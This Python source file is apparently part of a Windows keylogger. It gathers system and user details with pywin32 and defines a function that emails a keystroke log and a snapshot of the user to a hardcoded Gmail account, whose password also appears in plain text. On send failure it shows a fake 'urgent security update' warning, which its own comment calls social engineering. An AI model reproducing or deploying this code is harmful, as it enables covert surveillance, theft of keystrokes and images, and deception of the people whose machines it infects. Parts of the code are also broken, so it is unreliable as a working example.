#pywin32 modules
import win32api
import win32con
import win32gui
import win32file
 
#python modules
import os
import socket
import time
import threading
from smtplib import SMTP
from smtplib import SMTPException
from email.MIMEMultipart import MIMEMultipart
from email.MIMEText import MIMEText
from email.MIMEImage import MIMEImage

CompName="Computer Name:"+str(win32api.GetComputerName())#Computer Name
Username="User name:"+str(win32api.GetUserName())#User name ***
GetKeyboardLayoutList="Keyboard Layout List:"+(str(win32api.GetKeyboardLayoutList())#GetKeyboardLayoutList*****
CommandLine="Commandline:"+str(win32api.GetCommandLine())#Command line used
DomainName="DomainName:"+str(win32api.GetDomainName())#Domain name
FreeSpace="Free space:"+str(win32api.GetDiskFreeSpace())#Hard disk free space
LocalTime="Local time:"+str(win32api.GetLocalTime())#local time
LogicalDrives="Logical Drives:"+win32api.GetLogicalDriveStrings()#list of drivese.g C:\\,E:\\etc
PowerCapabilities="Power Capabilities:"+str(win32api.GetPwrCapabilities())#System power capabilites
language="Language:"+str(win32api.GetSystemDefaultLangID())#System set language
SystemInfo="System Info:"+str(win32api.GetSystemInfo())#system information
SystemInfo_2="System Info 2:"+str(win32api.GetNativeSystemInfo())#like above but for Wow64 process.
TempPath="Temp folder:"+str(win32api.GetTempPath())#path to temp file
TimeZone="Time Zone:"+str(win32api.GetTimeZoneInformation())#Time zone
WindowsVersion="Windows Version:"+str(win32api.GetVersion())#windows version

listdata=[CompName,CommandLine,DomainName,FreeSpace,LocalTime,LogicalDrives,
          PowerCapabilities,language,SystemInfo,SystemInfo_2,TempPath,TimeZone,
          WindowsVersion,Username,GetKeyboardLayoutList]

		  
def Mail_gmail(passwd="12345qwert@321",data="Hi Sir this is what i have collected!"):
    """Sends the keypress text file and user snapshot"""
    #email data
    subject="Data from ",CompName
    sender="llynch701@gmail.com"
    receiver="llynch701@gmail.com"
    gmailSMTP="smtp.gmail.com"
    gmailPort=587
    TextSubtype='plain'
   
    #create the email
    msg=MIMEMultipart()
    msg["Subject"]=subject
    msg["From"]=sender
    msg["To"]=receiver
    body=MIMEMultipart('alternative')
    body.attach(MIMEText(data,TextSubtype))
   
    #Attach the message
    msg.attach(body)
    msg.attach(MIMEText(file("Keystroke.txt").read()))
    #attach a pic of the user at start up.
    msg.attach(MIMEImage(file("user.jpg").read()))
    try:
      smtpObj = SMTP(gmailSMTP,gmailPort)
      #Identify yourself to GMAIL ESMTP server.
      smtpObj.ehlo()
      #Put SMTP connection in TLS mode and call ehlo again.
      smtpObj.starttls()
      smtpObj.ehlo()
      #Login to service
      smtpObj.login(user=sender, password=passwd)
      #Send email
      smtpObj.sendmail(sender, receiver, msg.as_string())
      #close connection and session.
      smtpObj.quit()
    except:
        #if error in send mail tell the user to connect to the internet
        #try some social engineering.
        win32api.MessageBox(None,"Please Connect to the internet.Windows requires a urgent security update!","Security update!",win32con.MB_ICONWARNING)
        threading.Timer(300,Mail_gmail)#wait for 5 min assuming the user has connected and send